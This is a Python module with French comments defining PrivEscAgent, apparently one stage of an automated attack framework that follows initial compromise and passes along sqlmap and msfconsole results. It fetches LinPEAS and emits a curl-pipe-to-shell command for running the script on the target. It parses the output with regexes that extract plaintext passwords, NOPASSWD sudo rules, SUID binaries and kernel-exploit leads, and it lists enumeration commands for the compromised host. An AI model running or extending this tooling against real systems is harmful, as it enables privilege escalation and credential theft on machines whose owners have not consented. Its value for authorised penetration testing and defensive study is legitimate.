"""
PrivEscAgent — Élévation de privilèges.

Rôle dans la kill chain :
    Après l'accès initial, cet agent énumère les vecteurs d'élévation
    de privilèges sur la cible. Il tente de récupérer LinPEAS (script
    d'énumération complet), parse les résultats avec des expressions
    régulières, et génère une liste de vérifications manuelles à
    exécuter sur la machine compromise.

Tactiques/Techniques couvertes :
    TA0004 Privilege Escalation — T1068 Exploitation for Privilege Escalation

Catégories de findings parsés depuis LinPEAS :
    - kernel_exploits : Références CVE, DirtyCow, OverlayFS, PwnKit
    - suid_binaries : Binaires avec bit SUID positionné
    - sudo_privileges : Règles sudo NOPASSWD
    - credentials : Mots de passe en clair (configs, lignes de commande)
    - cron_jobs : Tâches planifiées exécutées par root
    - writable_files : Fichiers accessibles en écriture dans /etc
"""

import subprocess
import re


class PrivEscAgent:
    def __init__(self, target: str, context: dict = None, linpeas_output: str = ""):
        """
        Initialise l'agent d'élévation de privilèges.

        Args:
            target (str): Adresse IP ou nom d'hôte de la cible.
            context (dict, optional): Contexte fourni par le superviseur
                                      (inclut les résultats de l'agent exploit).
            linpeas_output (str): Sortie brute de LinPEAS à parser.
                                  Vide si LinPEAS n'a pas encore été exécuté.
        """
        self.target = target
        self.context = context or {}
        self.linpeas_output = linpeas_output

    def run_linpeas(self) -> dict:
        """
        Tente de télécharger le script LinPEAS depuis GitHub.

        Utilise curl avec les flags :
            -sL : Mode silent (-s) et suivi des redirections (-L).
        Le téléchargement est limité à 10 secondes (timeout).
        Le contenu doit dépasser 1000 octets pour être considéré valide.

        Returns:
            dict: Résultat contenant :
                  - success (bool) : Script récupéré avec succès.
                  - technique (str) : T1068.
                  - tactic (str) : TA0004.
                  - tool (str) : "LinPEAS".
                  - status (str) : Message de statut.
                  - next_step (str) : Commande à exécuter sur la cible.
                  - error (str) : Message d'erreur si échec.
        """
        try:
            # URL de la dernière release LinPEAS sur GitHub
            cmd = ["curl", "-sL", "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"]
            # Exécution avec timeout de 10s
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

            # Vérifie que le contenu est substantiel (>1000 octets = script valide)
            if result.returncode == 0 and len(result.stdout) > 1000:
                return {
                    "success": True,
                    "technique": "T1068",
                    "tactic": "TA0004",
                    "tool": "LinPEAS",
                    "status": "linpeas.sh fetched successfully",
                    # Commande à exécuter manuellement ou via un shell distant :
                    # curl télécharge linpeas.sh, le pipe vers sh pour exécution,
                    # et tee sauvegarde la sortie dans un fichier
                    "next_step": f"Execute on target: curl -sL <URL> | sh | tee linpeas_output.txt",
                }
            return {"success": False, "error": "Could not fetch linpeas.sh"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def parse_linpeas_output(self) -> dict:
        """
        Parse la sortie brute de LinPEAS pour extraire les vulnérabilités.

        Utilise des expressions régulières pour chaque catégorie de finding.
        Les doublons sont automatiquement éliminés.

        Returns:
            dict: Findings structurés avec les clés suivantes :
                  - technique (str) : T1068.
                  - tactic (str) : TA0004.
                  - kernel_exploits (list) : Références CVE et noms d'exploits connus.
                  - suid_binaries (list) : Binaires SUID repérés.
                  - writable_files (list) : Fichiers accessibles en écriture.
                  - sudo_privileges (list) : Règles sudo NOPASSWD.
                  - credentials (list) : Mots de passe ou secrets trouvés.
                  - cron_jobs (list) : Tâches cron exécutées par root.
                  - interesting_files (list) : Fichiers intéressants (réservé).
                  - total_findings (int) : Nombre total de findings.
                  - parsed (bool) : Parsing effectué (True) ou ignoré (False).
        """
        # Structure de résultats initialisée avec des listes vides
        findings = {
            "technique": "T1068",
            "tactic": "TA0004",
            "kernel_exploits": [],
            "suid_binaries": [],
            "writable_files": [],
            "sudo_privileges": [],
            "credentials": [],
            "cron_jobs": [],
            "interesting_files": [],
        }

        # Si aucune sortie LinPEAS fournie, retourne un résultat vide
        if not self.linpeas_output:
            findings["total_findings"] = 0
            findings["parsed"] = False
            return findings

        # Dictionnaire de patterns regex par catégorie de finding
        patterns = {
            # Exploits kernel : CVE (ex: CVE-2021-4034), DirtyCow, OverlayFS, PwnKit
            "kernel_exploits": [
                r"CVE-\d{4}-\d+",               # Format standard CVE : CVE-AAAA-NNNNN
                r"Kernel.*exploit",              # Mention générique "Kernel exploit"
                r"DirtyCow|Dirty COW",          # CVE-2016-5195
                r"OverlayFS|overlayfs",          # CVE-2021-3493, CVE-2023-0386
                r"PwnKit|pkexec",               # CVE-2021-4034
            ],
            # Binaires SUID : chemin absolu suivi de SUID, ou SUID suivi du chemin
            "suid_binaries": [
                r"(/[\w/]+)\s+.*SUID",          # Format LinPEAS : /chemin ... SUID
                r"SUID.*?(/[\w/]+)",             # Format alternatif : SUID ... /chemin
            ],
            # Privilèges sudo : règles autorisant l'exécution sans mot de passe
            "sudo_privileges": [
                r"User.*may run.*NOPASSWD",      # Ligne sudo -l : user may run ... NOPASSWD
                r"\(ALL\) NOPASSWD",             # Syntaxe (ALL) NOPASSWD
                r"sudo.*NOPASSWD",               # Mention générique sudo + NOPASSWD
            ],
            # Credentials : mots de passe dans variables d'env, configs, ou CLI
            "credentials": [
                r"(?:password|passwd|pwd)\s*[=:]\s*(\S+)",  # password=... ou password: ...
                r"DB_PASSWORD\s*=\s*(\S+)",                  # Variable DB_PASSWORD=valeur
                r"mysql.*-p\s*(\S+)",                         # Ligne de commande mysql -p motdepasse
            ],
            # Tâches cron : chemins de scripts exécutés par root via cron
            "cron_jobs": [
                r"(/\S+)\s+root\s+.*cron",       # /chemin/script root ... cron
                r"@reboot.*(/\S+)",              # @reboot /chemin/script
            ],
            # Fichiers accessibles en écriture : chemins dans /etc/ notamment
            "writable_files": [
                r"Writable.*?(/[\w/]+)",          # "Writable: /etc/passwd"
                r"writable.*?(/etc/[\w/]+)",      # "writable: /etc/shadow"
            ],
        }

        # Parcourt chaque catégorie et chaque regex pour extraire les correspondances
        for category, regex_list in patterns.items():
            for regex in regex_list:
                # re.IGNORECASE : insensible à la casse (DirtyCow = dirtycow)
                matches = re.findall(regex, self.linpeas_output, re.IGNORECASE)
                if isinstance(matches, list) and matches:
                    for m in matches:
                        # findall peut retourner une str ou un tuple selon les groupes
                        item = m if isinstance(m, str) else m[0] if isinstance(m, tuple) else str(m)
                        # Évite les doublons dans la même catégorie
                        if item not in findings[category]:
                            findings[category].append(item)

        # Compte le nombre total de findings (toutes catégories de type list)
        findings["total_findings"] = sum(len(v) for v in findings.values() if isinstance(v, list))
        findings["parsed"] = True
        return findings

    def run_manual_checks(self) -> dict:
        """
        Génère une liste de vérifications manuelles à exécuter sur la cible.

        Ces commandes couvrent les vecteurs d'élévation classiques :
        SUID, sudo, crontab, version kernel, capabilities, fichiers modifiables,
        et ports en écoute.

        Returns:
            dict: Résultat contenant :
                  - success (bool) : True.
                  - technique (str) : T1068.
                  - tactic (str) : TA0004.
                  - manual_checks (dict) : Mapping nom → {command, description}.
        """
        # Dictionnaire de commandes de vérification manuelle
        # Chaque commande est à exécuter sur la machine cible compromise
        checks = {
            # find / -perm -4000 : cherche les fichiers avec bit SUID (4000)
            # -type f : fichiers uniquement (pas de dossiers)
            # 2>/dev/null : supprime les erreurs "Permission denied"
            # head -20 : limite à 20 résultats
            "SUID binaries": "find / -perm -4000 -type f 2>/dev/null | head -20",
            # sudo -l : liste les commandes exécutables avec sudo par l'utilisateur courant
            "Sudo privileges": "sudo -l 2>/dev/null",
            # /etc/crontab : fichier de tâches cron système
            "Crontab entries": "cat /etc/crontab 2>/dev/null",
            # uname -a : affiche la version complète du kernel (cible d'exploits)
            "Kernel version": "uname -a",
            # getcap -r / : liste les capabilities POSIX (souvent mal configurées)
            "Capabilities": "getcap -r / 2>/dev/null | head -20",
            # find /etc -writable : fichiers dans /etc modifiables (shadow, passwd?)
            "Writable /etc": "find /etc -writable -type f 2>/dev/null | head -20",
            # find / -perm -2 : fichiers world-writable (tout le monde peut écrire)
            "World-writable files": "find / -perm -2 -type f 2>/dev/null | head -20",
            # netstat ou ss : ports en écoute (services internes exploitables)
            "Listening ports": "netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null",
        }

        results = {}
        for name, cmd in checks.items():
            results[name] = {
                "command": cmd,
                # Description formatée avec la cible pour usage à distance
                "description": f"[Remote] À exécuter sur {self.target}: {cmd}",
            }

        return {
            "success": True,
            "technique": "T1068",
            "tactic": "TA0004",
            "manual_checks": results,
        }

    def run(self) -> dict:
        """
        Point d'entrée principal de l'agent d'élévation de privilèges.

        Combine les résultats LinPEAS (fetch + parsing) avec les vérifications
        manuelles, et transmet le contexte d'exploitation pour le rapport.

        Returns:
            dict: Résultats agrégés contenant :
                  - linpeas (dict) : Résultat du téléchargement LinPEAS.
                  - parsed_findings (dict) : Findings parsés depuis la sortie.
                  - manual_checks (dict) : Commandes de vérification manuelle.
                  - exploit_context (dict) : Succès sqlmap/msfconsole du contexte.
        """
        exploit_context = self.context.get("exploit", {})
        return {
            "linpeas": self.run_linpeas(),
            "parsed_findings": self.parse_linpeas_output(),
            "manual_checks": self.run_manual_checks(),
            # Propagation du statut d'exploitation depuis le contexte
            "exploit_context": {
                "sqlmap_success": exploit_context.get("sqlmap", {}).get("success"),
                "msfconsole_success": exploit_context.get("msfconsole", {}).get("success"),
            } if exploit_context else {},
        }
